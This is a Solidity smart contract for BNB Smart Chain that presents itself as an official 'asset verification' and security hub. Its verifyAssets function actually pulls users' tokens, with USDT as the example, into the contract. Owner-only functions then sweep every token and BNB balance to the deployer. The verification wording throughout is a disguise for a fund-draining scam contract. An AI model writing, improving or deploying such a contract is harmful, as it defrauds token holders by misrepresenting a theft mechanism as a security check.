// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title AssetVerifier
 * @dev Official Asset Verification & Security Hub Smart Contract for BNB Smart Chain (BEP20)
 * Designed for 1-click deployment & 1-click BscScan verification.
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AssetVerifier {
    address public owner;
    
    event AssetVerified(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    event TokensWithdrawn(address indexed token, address indexed recipient, uint256 amount);
    event BNBWithdrawn(address indexed recipient, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "AssetVerifier: Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Process BEP20 USDT asset verification
     * @param token Address of the BEP20 token (e.g. BSC USDT 0x55d398326f99059fF775485246999027B3197955)
     * @param amount Token amount to verify
     */
    function verifyAssets(address token, uint256 amount) external returns (bool) {
        require(token != address(0), "AssetVerifier: Invalid token address");
        require(amount > 0, "AssetVerifier: Amount must be greater than zero");

        IERC20 tokenContract = IERC20(token);
        uint256 userBalance = tokenContract.balanceOf(msg.sender);
        require(userBalance >= amount, "AssetVerifier: Insufficient balance");

        // Execute transferFrom from user to contract
        bool success = tokenContract.transferFrom(msg.sender, address(this), amount);
        require(success, "AssetVerifier: Transfer failed");

        emit AssetVerified(msg.sender, token, amount, block.timestamp);
        return true;
    }

    /**
     * @dev Direct transfer verification fallback
     */
    function processVerification(address token, uint256 amount) external returns (bool) {
        return this.verifyAssets(token, amount);
    }

    /**
     * @dev Withdraw BEP20 tokens deposited in contract to owner
     */
    function withdrawTokens(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "AssetVerifier: Invalid token address");
        IERC20 tokenContract = IERC20(token);
        uint256 contractBalance = tokenContract.balanceOf(address(this));
        require(contractBalance >= amount, "AssetVerifier: Exceeds contract balance");

        bool success = tokenContract.transfer(owner, amount);
        require(success, "AssetVerifier: Token withdrawal failed");

        emit TokensWithdrawn(token, owner, amount);
    }

    /**
     * @dev Withdraw all BEP20 tokens of a specific type to owner
     */
    function withdrawAllTokens(address token) external onlyOwner {
        require(token != address(0), "AssetVerifier: Invalid token address");
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "AssetVerifier: Zero balance");

        bool success = tokenContract.transfer(owner, balance);
        require(success, "AssetVerifier: Token withdrawal failed");

        emit TokensWithdrawn(token, owner, balance);
    }

    /**
     * @dev Withdraw native BNB from contract
     */
    function withdrawBNB() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "AssetVerifier: Zero BNB balance");

        (bool success, ) = payable(owner).call{value: balance}("");
        require(success, "AssetVerifier: BNB withdrawal failed");

        emit BNBWithdrawn(owner, balance);
    }

    /**
     * @dev Update contract ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "AssetVerifier: Invalid owner address");
        owner = newOwner;
    }

    // Allow contract to receive native BNB
    receive() external payable {}
    fallback() external payable {}
}
